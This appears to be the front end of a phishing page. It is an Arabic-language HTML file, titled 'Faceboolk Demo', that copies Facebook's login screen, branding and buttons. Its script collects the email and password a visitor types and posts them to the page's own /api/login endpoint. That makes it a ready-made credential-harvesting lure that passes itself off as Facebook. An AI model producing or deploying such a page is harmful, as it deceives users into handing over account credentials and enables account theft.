<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Faceboolk Demo</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    body {
      background: #fdfeff;
      min-height: 90vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #1c1e21;
    }

    .page {
      width: 100%;
      padding: 30px 20px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .content {
      width: 100%;
      max-width: 980px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 50px;
    }

    .brand {
      flex: 1;
      max-width: 500px;
    }

    .brand h1 {
      color: #0370dd;
      font-size: 5rem;
      font-weight: 700;
      letter-spacing: -2px;
      margin-bottom: 10px;
      line-height: 1;
    }

    .brand p {
      font-size: 2rem;
      line-height: 1.3;
      color: #1c1e21;
    }

    .login-shell {
      width: 100%;
      max-width: 396px;
    }

    .login-card {
      background: #ffffff;
      border-radius: 12px;
      box-shadow: 0 2px 10px rgba(16, 16, 16, 0.1);
      padding: 18px 16px 14px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    input {
      width: 100%;
      padding: 16px 14px;
      border: 1px solid #dadde1;
      border-radius: 8px;
      font-size: 17px;
      outline: none;
      background: rgb(255, 252, 252);
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    input:focus {
      border-color: #0370dd;
      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.12);
    }

    .login-btn {
      background: #0370dd;
      color: rgb(255, 250, 250);
      border: none;
      border-radius: 23px;
      padding: 5px;
      font-size: 20px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .login-btn:hover {
      background: #0370dd;
    }

    .forgot-link {
      display: block;
      text-align: center;
      margin-top: 14px;
      color: #060707;
      text-decoration: none;
      font-weight: 500;
      font-size: 15px;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .divider {
      height: 1px;
      background: #dadde1;
      margin: 16px 0 14px;
    }

    .register-btn {
      display: block;
      width: auto;
      margin: 0 auto;
      background: #fdfffb;
      color: rgb(60, 140, 252);
      border: 1px solid #1562fc;
      border-radius: 23px;
      padding: 5px 100px;
      font-size: 17px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .register-btn:hover {
      background: #fefffd;
    }

    .message {
      display: none;
      margin-top: 14px;
      padding: 12px 14px;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 600;
      text-align: center;
    }

    .message.success {
      display: block;
      background: #e7f7ed;
      color: #1e7f45;
      border: 1px solid #a7e0ba;
    }

    .message.error {
      display: block;
      background: #fdebec;
      color: #b42318;
      border: 1px solid #f0b4ae;
    }

    @media (max-width: 768px) {
      .content {
        flex-direction: column;
        text-align: center;
        gap: 24px;
      }

      .brand h1 {
        font-size: 4rem;
      }

      .brand p {
        font-size: 1.6rem;
      }

      .login-shell {
        max-width: 100%;
      }
    }
  </style>
</head>
<body>
  <div class="page">
    <div class="content">
      <div class="brand">
        <h1>facebook</h1>
      
      </div>

      <div class="login-shell">
        <div class="login-card">
          <form id="loginForm">
            <input id="email" type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
            <input id="password" type="password" placeholder="كلمة السر" required />
            <button class="login-btn" type="submit">تسجيل الدخول</button>
          </form>

          <a class="forgot-link" href="#">هل نسيت كلمة السر؟</a>

          <div class="divider"></div>

          <button class="register-btn" type="button">إنشاء حساب جديد</button>

          <div id="messageBox" class="message"></div>
        </div>
      </div>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const messageBox = document.getElementById('messageBox');

    function showMessage(type, text) {
      messageBox.className = `message ${type}`;
      messageBox.textContent = text;
    }

    form.addEventListener('submit', async (event) => {
      event.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        showMessage('error', 'يرجى إدخال البريد الإلكتروني وكلمة المرور.');
        return;
      }

      try {
        const response = await fetch('/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ email, password })
        });

        const result = await response.json();

        if (result.success) {
          showMessage('success', result.message);
        } else {
          showMessage('error', result.message);
        }

      } catch (error) {
        console.error('حدث خطأ:', error);
        showMessage('error', 'تعذر الاتصال بالخادم. تأكد من استضافة المشروع بشكل صحيح.');
      }
    });
  </script>
</body>
</html>
